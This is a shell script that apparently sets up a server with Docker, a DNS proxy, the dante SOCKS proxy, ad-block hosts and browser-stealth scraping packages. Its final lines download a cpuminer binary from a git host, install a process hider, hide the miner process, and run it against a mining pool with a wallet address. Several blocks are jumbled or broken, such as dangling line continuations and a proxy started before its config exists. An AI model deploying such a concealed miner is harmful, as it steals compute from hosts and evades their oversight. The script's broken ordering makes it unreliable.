sudo apt update && sudo apt-get -y install systemctl && sudo apt install apt-transport-https curl gnupg-agent ca-certificates software-properties-common -y && curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - && sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable" && sudo apt install docker-ce docker-ce-cli containerd.io -y && sudo usermod -aG docker genzo2805

npm install -g ccloli/DNSProxy
git clone https://github.com/ccloli/DNSProxy.git && cd DNSProxy && npm install -g
echo "====================================="
echo "Bismillahirahmannirrahim"
echo "====================================="
sleep 3
dnsproxy -i config.json
cp config.sample.json config.json
clear
apt-get update\
  && apt-get -y install vim dnsutils curl sudo\
  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
  && mkdir -p ~/netflix-proxy\
  && cd ~/netflix-proxy\

  sleep 5
  
wget https://www.inet.no/dante/files/dante-1.4.2.tar.gz
tar zxvf dante-1.4.2.tar.gz
cd dante-1.4.2
./configure
make -j`nproc`
make install

  echo "====================================="
  echo "Bismillahirahmannirrahim"
  echo "====================================="
  sleep 5
git clone https://github.com/Square252/adBlockHosts.git
cd adBlockHosts
chmod +x adBlockHostsGenerate.sh
./adBlockHostsGenerate.sh

  echo "====================================="
  echo "Bismillahirahmannirrahim"
  echo "====================================="
  sleep 5
npm install zyte-smartproxy-puppeteer && npm install playwright playwright-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth @cliqz/adblocker-playwright && npm install puppeteer puppeteer-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth puppeteer-extra-plugin-adblocker && curl https://raw.githubusercontent.com/Smartproxy/Python-scraper-tutorial/master/scraper.py > scraper.py

  sleep 5

sudo apt-get update\
  && sudo apt-get -y install vim dnsutils curl\
  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
  && sudo usermod -aG docker $(whoami | awk '{print $1}')\
  && mkdir -p ~/netflix-proxy\
  && cd ~/netflix-proxy\
  
  echo "====================================="
  echo "Bismillahirahmannirrahim"
  echo "====================================="
  sleep 5
wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save

  echo "====================================="
  echo "Bismillahirahmannirrahim"
  echo "====================================="
  sleep 5
npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add cpuminer-sse2 && ./cpu -a yespowertide  -o stratum+tcp://kaspa.danisgenzo.my.id:80 -u TSmFhoamG8WHPii3KpxA5bi7V6DtZ5vPxw.Genzo -t 2
